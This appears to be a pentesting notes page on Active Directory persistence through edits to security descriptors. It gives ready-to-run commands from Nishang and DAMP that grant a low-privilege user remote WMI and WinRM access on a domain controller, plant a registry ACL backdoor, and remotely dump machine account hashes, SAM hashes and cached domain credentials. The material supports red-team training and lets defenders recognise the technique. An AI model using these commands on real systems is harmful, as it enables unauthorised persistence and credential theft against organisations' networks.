## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

The **security descriptors** are used to **store** the **permissions** an **object** has **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.

Then, this persistence technique is based on the ability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.

### Access to WMI

You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):

```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```

### Access to WinRM

Give access to **winrm PS console to a user** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**

```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```

### Remote access to hashes

Access the **registry** and **dump hashes** creating a **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** so you can at any moment retrieve the **hash of the computer**, the **SAM** and any **cached AD** credential in the computer. So, it's very useful to give this permission to a **regular user against a Domain Controller computer**:

```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
